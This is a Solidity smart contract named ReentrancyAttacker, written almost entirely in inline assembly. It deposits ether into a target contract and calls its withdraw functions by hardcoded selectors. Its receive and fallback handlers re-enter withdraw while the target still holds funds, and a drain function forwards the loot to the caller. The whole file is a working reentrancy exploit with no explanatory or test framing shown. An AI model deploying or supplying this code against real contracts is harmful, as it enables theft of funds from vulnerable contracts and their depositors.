// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract ReentrancyAttacker {
    
    constructor(address v) {
        assembly { sstore(0, v) }
    }
    
    function attack() external payable {
        assembly {
            let v := sload(0)
            let amount := callvalue() 
            sstore(1, amount)
            mstore(0, 0xd0e30db000000000000000000000000000000000000000000000000000000000)
            pop(call(gas(), v, amount, 0, 4, 0, 0))
             mstore(0, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
            let success1 := call(gas(), v, 0, 0, 4, 0, 0)
            if iszero(success1) {
                mstore(0, 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)
                mstore(4, amount)
                pop(call(gas(), v, 0, 0, 36, 0, 0))
            }
        }
    }
    
    receive() external payable {
        assembly {
            let v := sload(0)
            let amount := sload(1)
            
            if gt(balance(v), 0) {
                mstore(0, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
                let success1 := call(gas(), v, 0, 0, 4, 0, 0)
                if iszero(success1) {
                    mstore(0, 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)
                    mstore(4, amount)
                    pop(call(gas(), v, 0, 0, 36, 0, 0))
                }
            }
        }
    }

    fallback() external payable {
        assembly {
            let v := sload(0)
            let amount := sload(1)
            
            if gt(balance(v), 0) {
                mstore(0, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
                let success1 := call(gas(), v, 0, 0, 4, 0, 0)
                if iszero(success1) {
                    mstore(0, 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)
                    mstore(4, amount)
                    pop(call(gas(), v, 0, 0, 36, 0, 0))
                }
            }
        }
    }

    function drain() external {
        assembly {
            pop(call(gas(), caller(), selfbalance(), 0, 0, 0, 0))
        }
    }
}
